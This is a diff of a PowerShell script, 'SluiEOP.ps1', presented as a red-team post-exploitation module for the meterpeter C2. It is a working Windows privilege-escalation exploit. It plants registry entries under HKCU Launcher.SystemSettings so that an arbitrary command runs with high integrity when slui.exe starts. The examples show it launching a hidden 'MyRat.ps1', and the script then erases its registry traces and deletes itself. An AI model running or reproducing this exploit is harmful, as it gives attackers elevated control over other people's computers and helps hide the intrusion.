@@ -1,6 +1,6 @@
 <#
 .SYNOPSIS
-   SluiEOP can be used for privilege escalation or to execute one command with high integrity (SYSTEM)
+   SluiEOP can be used to escalate privileges or to execute a command with high integrity (SYSTEM)
 
    Author: r00t-3xp10it (SSA RedTeam @2020)
    Tested Under: Windows 10 - 18363.778
@@ -15,14 +15,15 @@
    activation key to a new one, the tool (ChangePK) doesn’t open itself with high privilege but there is another tool opens
    ChangePK with high privileges named sliu.exe Slui doesn’t support a feature that runs it as administrator automatically,
    but we can do that manually by either clicking on slui with a right click and click on “Run as administrator” or using:
-   powershell.exe start-process slui.exe -verb runas
+   powershell.exe Start-Process "C:\Windows\System32\slui.exe" -verb runas
 
 .NOTES
-   SluiEOP.ps1 script was written to be executed in meterpeter C2 (does not display outputs)
+   SluiEOP.ps1 script was written as meterpeter C2 Post-Exploitation module.
+   This script 'reverts' regedit hacks to the previous state before the EOP.
 
 .EXAMPLE
    PS C:\> powershell.exe -File SluiEOP.ps1 "powershell.exe"
-   Execute powershell with high privileges (SYSTEM)
+   Execute powershell process with high privileges (SYSTEM)
 
 .EXAMPLE
    PS C:\> ./SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad"
@@ -30,10 +31,10 @@
 
 .EXAMPLE
    PS C:\> ./SluiEOP.ps1 "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1"
-   Execute MyRat.ps1 script with high privileges (SYSTEM)
+   Execute $env:TMP\MyRat.ps1 script with high privileges (SYSTEM) in an hidden console.
 
 .INPUTS
-   None. You cannot pipe objects to SluiEOP.ps1
+   None. You cannot pipe objects into SluiEOP.ps1
 
 .OUTPUTS
    None. this script does not display any outputs.
@@ -60,43 +61,42 @@ If($CheckVuln -eq $True){
 
    ## For those who run SluiEOP.ps1 outside meterpeter C2
    If(-not(Test-Path "$env:TMP\Update-KB4524147.ps1")){
-      Write-Host "SluiEOP v1.4 - By: r00t-3xp10it (SSAredTeam)" -ForeGroundColor Green
+      Write-Host "SluiEOP v1.4 - By: r00t-3xp10it (SSA RedTeam)" -ForeGroundColor Green
       Write-Host "[+] Executing Command: '$Command'"
    }
 
-   ### Add Entrys to Regedit {using powershell}
-   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings" -Force|Out-Null;Start-Sleep -Seconds 1
-   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value 'Open' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
-   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Force|Out-Null;Start-Sleep -Seconds 1
-   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Force|Out-Null;Start-Sleep -Seconds 1
-   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "(default)" -Value Open -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
-   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "MuiVerb" -Value "@appresolver.dll,-8501" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
-   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Force|Out-Null;Start-Sleep -Seconds 1
+   ### Add Entrys to Regedit { using powershell }
+   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings" -Force|Out-Null;Start-Sleep -Milliseconds 700
+   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value 'Open' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
+   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Force|Out-Null;Start-Sleep -Milliseconds 700
+   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Force|Out-Null;Start-Sleep -Milliseconds 700
+   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "(default)" -Value Open -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
+   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "MuiVerb" -Value "@appresolver.dll,-8501" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
+   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Force|Out-Null;Start-Sleep -Milliseconds 700
 
    ## The Next Registry entry allow us to execute our command under high privileges (SYSTEM)
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "(default)" -Value "$Command" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "DelegateExecute" -Value '' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
-   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Force|Out-Null;Start-Sleep -Seconds 1
-   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Force|Out-Null;Start-Sleep -Seconds 1
-   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Name "(default)" -Value '{470C0EBD-5D73-4d58-9CED-E91E22E23282}' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
-   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Force|Out-Null;Start-Sleep -Seconds 1
-   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Name "(default)" -Value 'Taskband Pin' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
+   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Force|Out-Null;Start-Sleep -Milliseconds 700
+   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Force|Out-Null;Start-Sleep -Milliseconds 700
+   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Name "(default)" -Value '{470C0EBD-5D73-4d58-9CED-E91E22E23282}' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
+   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Force|Out-Null;Start-Sleep -Milliseconds 700
+   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Name "(default)" -Value 'Taskband Pin' -Force -ErrorAction SilentlyContinue|Out-Null
 
-   ### Start vulnerable process {using powershell}
-   Start-Sleep -Seconds 2;Start-Process "$env:WINDIR\System32\Slui.exe" -Verb runas
+   ### Start the vulnerable process { using powershell }
+   Start-Sleep -Milliseconds 2700;Start-Process "$env:WINDIR\System32\Slui.exe" -Verb runas
 
    Start-Sleep -Milliseconds 2600
-   ### Revert Regedit to 'DEFAULT' settings after all testings done ..
+   ### Revert Regedit to 'DEFAULT' settings after EOP finished ..
    Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
    Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force
-   Start-Sleep -Seconds 2;
 
 }else{
    echo "   ERROR    System Doesn't Seems Vulnerable, Aborting." > $env:TMP\fail.log
 }
 
-## Clean old files/configurations
+## Clean old files/configurations left behind after EOP finished ..
 If(Test-Path "$env:TMP\fail.log"){Get-Content -Path "$env:TMP\fail.log" -EA SilentlyContinue;Remove-Item -Path "$env:TMP\fail.log" -Force -EA SilentlyContinue}
 If(Test-Path "$env:TMP\SluiEOP.ps1"){Remove-Item -Path "$env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
 Exit
